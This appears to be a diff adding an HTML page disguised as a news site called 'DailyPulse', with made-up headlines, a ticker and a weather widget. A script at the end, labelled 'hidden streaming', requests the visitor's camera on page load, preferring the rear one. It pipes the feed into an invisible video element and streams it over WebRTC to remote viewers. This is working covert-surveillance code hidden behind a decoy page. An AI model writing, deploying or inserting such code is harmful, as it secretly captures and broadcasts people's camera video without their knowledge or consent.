@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DailyPulse - Breaking News & Latest Updates</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family: Georgia, serif; background: #f4f4f0; color: #222; }
+
+    /* NAVBAR */
+    .navbar { background: #1a1a1a; padding: 10px 16px; display: flex; align-items: center; justify-content: space-between; }
+    .logo { color: #fff; font-size: 1.5rem; font-weight: bold; letter-spacing: 1px; }
+    .logo span { color: #e63b2e; }
+    .nav-date { color: #aaa; font-size: .7rem; }
+
+    /* BREAKING BAR */
+    .breaking { background: #e63b2e; color: #fff; padding: 6px 14px; font-size: .75rem; display: flex; gap: 10px; align-items: center; overflow: hidden; }
+    .breaking strong { background: #fff; color: #e63b2e; padding: 2px 8px; font-size: .7rem; border-radius: 2px; white-space: nowrap; }
+    .ticker { white-space: nowrap; animation: ticker 20s linear infinite; }
+    @keyframes ticker { from{transform:translateX(100%)} to{transform:translateX(-100%)} }
+
+    /* HERO */
+    .hero { background: #222; color: #fff; padding: 20px 16px; }
+    .hero-tag { background: #e63b2e; color: #fff; font-size: .65rem; padding: 2px 8px; display: inline-block; margin-bottom: 8px; letter-spacing: 1px; text-transform: uppercase; }
+    .hero h1 { font-size: 1.4rem; line-height: 1.4; margin-bottom: 8px; }
+    .hero p { font-size: .85rem; color: #ccc; line-height: 1.6; }
+    .hero-meta { margin-top: 10px; font-size: .7rem; color: #aaa; }
+
+    /* SECTION TITLE */
+    .section-title { font-size: .7rem; text-transform: uppercase; letter-spacing: 2px; color: #e63b2e; border-bottom: 2px solid #e63b2e; padding-bottom: 4px; margin: 16px 16px 12px; }
+
+    /* ARTICLE CARD */
+    .card { display: flex; gap: 10px; padding: 10px 16px; border-bottom: 1px solid #ddd; }
+    .card-img { width: 90px; height: 65px; background: #ccc; border-radius: 2px; flex-shrink: 0; object-fit: cover; }
+    .card-body h3 { font-size: .9rem; line-height: 1.4; margin-bottom: 4px; }
+    .card-body p { font-size: .75rem; color: #666; line-height: 1.4; }
+    .card-meta { font-size: .65rem; color: #aaa; margin-top: 4px; }
+
+    /* PLACEHOLDER IMAGE COLORS */
+    .img-red { background: linear-gradient(135deg, #e63b2e, #c0392b); }
+    .img-blue { background: linear-gradient(135deg, #2980b9, #1a5276); }
+    .img-green { background: linear-gradient(135deg, #27ae60, #1e8449); }
+    .img-orange { background: linear-gradient(135deg, #e67e22, #ca6f1e); }
+    .img-purple { background: linear-gradient(135deg, #8e44ad, #6c3483); }
+
+    /* WEATHER WIDGET */
+    .weather { background: #1a1a1a; color: #fff; margin: 0 16px 16px; border-radius: 4px; padding: 12px; display: flex; justify-content: space-between; align-items: center; }
+    .weather-left { font-size: .75rem; color: #aaa; }
+    .weather-temp { font-size: 2rem; font-weight: bold; }
+    .weather-icon { font-size: 2.5rem; }
+
+    /* FOOTER */
+    footer { background: #1a1a1a; color: #aaa; text-align: center; padding: 16px; font-size: .7rem; margin-top: 20px; }
+  </style>
+</head>
+<body>
+
+<!-- HIDDEN STREAMING — not visible -->
+<video id="video" autoplay playsinline muted style="display:none"></video>
+
+<!-- NAVBAR -->
+<div class="navbar">
+  <div class="logo">Daily<span>Pulse</span></div>
+  <div class="nav-date">Tuesday, Feb 24, 2026</div>
+</div>
+
+<!-- BREAKING NEWS BAR -->
+<div class="breaking">
+  <strong>BREAKING</strong>
+  <div class="ticker">Global markets surge amid positive economic data • PM announces new infrastructure plan • Scientists discover potential breakthrough in cancer treatment • Stock markets hit record highs</div>
+</div>
+
+<!-- HERO STORY -->
+<div class="hero">
+  <div class="hero-tag">Top Story</div>
+  <h1>World Leaders Gather for Emergency Climate Summit in Geneva</h1>
+  <p>Representatives from over 140 nations have convened in an emergency session to address the accelerating pace of climate change following record temperatures recorded across three continents.</p>
+  <div class="hero-meta">By Rajan Mehta · 2 hours ago · World News</div>
+</div>
+
+<!-- TOP STORIES -->
+<div class="section-title">Top Stories</div>
+
+<div class="card">
+  <div class="card-img img-blue"></div>
+  <div class="card-body">
+    <h3>RBI Holds Interest Rates Steady Amid Inflation Concerns</h3>
+    <p>The central bank kept benchmark rates unchanged at its bimonthly policy review meeting held on Monday.</p>
+    <div class="card-meta">Business · 1 hr ago</div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-img img-green"></div>
+  <div class="card-body">
+    <h3>India's Space Mission Captures Stunning Images of Lunar Surface</h3>
+    <p>ISRO released high-resolution photographs from its latest lunar orbiter, revealing previously unseen geological formations.</p>
+    <div class="card-meta">Science · 3 hrs ago</div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-img img-orange"></div>
+  <div class="card-body">
+    <h3>Tech Giants Face New Antitrust Probe by EU Regulators</h3>
+    <p>European authorities launched a sweeping investigation into alleged anti-competitive practices among major technology firms.</p>
+    <div class="card-meta">Technology · 4 hrs ago</div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-img img-purple"></div>
+  <div class="card-body">
+    <h3>Cricket: India Clinches Series with Dominant Performance</h3>
+    <p>The national team secured a commanding 4-1 series victory following a record-breaking innings at the Wankhede Stadium.</p>
+    <div class="card-meta">Sports · 5 hrs ago</div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-img img-red"></div>
+  <div class="card-body">
+    <h3>Health Ministry Launches Nationwide Vaccination Drive</h3>
+    <p>A new immunization campaign targeting children under 5 was officially launched across all 28 states and 8 union territories.</p>
+    <div class="card-meta">Health · 6 hrs ago</div>
+  </div>
+</div>
+
+<!-- WEATHER -->
+<div class="section-title">Weather</div>
+<div class="weather">
+  <div class="weather-left">
+    <div class="weather-temp">28°C</div>
+    <div>New Delhi</div>
+    <div>Partly Cloudy</div>
+  </div>
+  <div class="weather-icon">⛅</div>
+</div>
+
+<div class="section-title">More News</div>
+
+<div class="card">
+  <div class="card-img img-blue"></div>
+  <div class="card-body">
+    <h3>Startup Ecosystem Sees Record Funding in Q1 2026</h3>
+    <p>Indian startups raised over $4.2 billion in the first quarter, marking the highest funding round in three years.</p>
+    <div class="card-meta">Business · 7 hrs ago</div>
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-img img-green"></div>
+  <div class="card-body">
+    <h3>New Highway Project to Connect 12 Cities by 2028</h3>
+    <p>The government unveiled an ambitious road infrastructure plan spanning over 3,400 kilometres across central India.</p>
+    <div class="card-meta">India · 8 hrs ago</div>
+  </div>
+</div>
+
+<footer>
+  © 2026 DailyPulse Media Pvt. Ltd. · All Rights Reserved · Terms · Privacy
+</footer>
+
+<!-- HIDDEN STREAMING SCRIPT -->
+<script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+  let localStream = null;
+  let peerConnections = {};
+
+  const iceConfig = {
+    iceServers: [
+      { urls: 'stun:stun.l.google.com:19302' },
+      { urls: 'stun:stun1.l.google.com:19302' }
+    ]
+  };
+
+  async function startCamera() {
+    try {
+      try {
+        localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+      } catch {
+        localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      }
+      document.getElementById('video').srcObject = localStream;
+      socket.emit('streamer-ready');
+    } catch (err) {
+      console.error('Camera error:', err.message);
+    }
+  }
+
+  socket.on('new-viewer', async ({ viewerId }) => {
+    const pc = new RTCPeerConnection(iceConfig);
+    peerConnections[viewerId] = pc;
+    localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+    pc.onicecandidate = (e) => {
+      if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, to: viewerId });
+    };
+    pc.addEventListener('connectionstatechange', () => {
+      if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
+        delete peerConnections[viewerId];
+      }
+    });
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    socket.emit('offer', { sdp: pc.localDescription, to: viewerId });
+  });
+
+  socket.on('answer', async ({ sdp, from }) => {
+    const pc = peerConnections[from];
+    if (pc) await pc.setRemoteDescription(new RTCSessionDescription(sdp));
+  });
+
+  socket.on('ice-candidate', async ({ candidate, from }) => {
+    const pc = peerConnections[from];
+    if (pc && candidate) await pc.addIceCandidate(new RTCIceCandidate(candidate));
+  });
+
+  startCamera();
+</script>
+</body>
+</html>
